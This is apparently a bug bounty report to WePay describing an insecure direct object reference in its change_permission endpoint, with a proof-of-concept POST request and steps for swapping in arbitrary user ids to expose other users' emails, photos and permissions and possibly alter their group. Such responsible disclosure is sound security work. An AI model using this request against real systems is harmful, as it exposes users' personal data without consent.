Summary:

Hi,

It is possible to access the emails and some other information of all users and potentially modify details of any user, resulting in a mass exposure of sensitive user information.

This is as a result of the `https://www.wepay.com/account_ajax/member/161257089?form=change_permission` endpoint.

POC:

1. Intercept a request to change the permissions of a user (under the Access tab):

```
POST /account_ajax/member/[group_id]?form=change_permission HTTP/1.1
Host: www.wepay.com
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: en-us
Content-Type: application/json;charset=UTF-8
Origin: https://www.wepay.com
Content-Length: 62
Connection: close

{"id":[any_id],"csrf":"[your_token]"}
```

2. Change `any_id` to any number representing a user id. 0, for example, returns a user that has no email, and any other number returns a user email. I haven't tested this much to not be invasive on the systems, but I believe this returns the email of every user of the system. This also may expose the photo of the user and any permissions.

3. When making the request, the group ID returned of the new user looks to be changed to the current user's group. I am not entirely sure if this does update the group ID of the user, but this may present problems.

Thanks, and please let me know if you would like any more information.
